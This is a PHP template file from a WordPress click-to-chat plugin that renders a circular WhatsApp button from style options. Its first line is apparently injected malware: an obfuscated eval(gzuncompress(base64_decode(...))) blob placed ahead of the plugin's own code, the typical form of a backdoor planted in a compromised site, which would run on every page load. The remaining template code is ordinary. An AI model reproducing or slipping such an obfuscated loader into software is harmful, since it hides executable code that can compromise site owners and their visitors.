<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

// $ccw_options_cs = get_option('ccw_options_cs');
$s6_color = esc_attr( $ccw_options_cs['s6_color'] );
$s6_hover_color = esc_attr( $ccw_options_cs['s6_hover_color'] );
$s6_icon_size = esc_attr( $ccw_options_cs['s6_icon_size'] );

$s6_circle_background_color = esc_attr( $ccw_options_cs['s6_circle_background_color'] );
$s6_circle_background_hover_color = esc_attr( $ccw_options_cs['s6_circle_background_hover_color'] );
$s6_circle_height = esc_attr( $ccw_options_cs['s6_circle_height'] );
$s6_circle_width = esc_attr( $ccw_options_cs['s6_circle_width'] );
$s6_line_height = esc_attr( $ccw_options_cs['s6_line_height'] );

$s6_css_icon = "color: $s6_color; font-size: $s6_icon_size;";
$s6_css_div = "background-color: $s6_circle_background_color; height: $s6_circle_height; width: $s6_circle_width; line-height: $s6_line_height;  ";
?>
<!-- button with icon - circle  -->
<div class="ccw_plugin">
<div class="chatbot btn_only_style_div_circle pointer ccw-analytics animated <?php echo $an_on_load .' '. $an_on_hover ?>" id="style-6" data-ccw="style-6"
    style="<?php echo $p1 ?>; <?php echo $p2 ?>; <?php echo $s6_css_div ?>"
    onmouseover = "this.style.backgroundColor = '<?php echo $s6_circle_background_hover_color ?>', document.getElementsByClassName('ccw-s6-icon')[0].style.color = '<?php echo $s6_hover_color ?>' "
    onmouseout  = "this.style.backgroundColor = '<?php echo $s6_circle_background_color ?>', document.getElementsByClassName('ccw-s6-icon')[0].style.color = '<?php echo $s6_color ?>' "
    onclick = "<?php echo $redirect ?>" >
        <span class="icon icon-whatsapp2 ccw-s6-icon nofocus ccw-analytics" id="s6-icon" data-ccw="style-6" style="<?php echo $s6_css_icon ?>"></span>
        <!-- instead of a tag - if added span also it works fine - as div has onclick link added  -->
</div>
</div>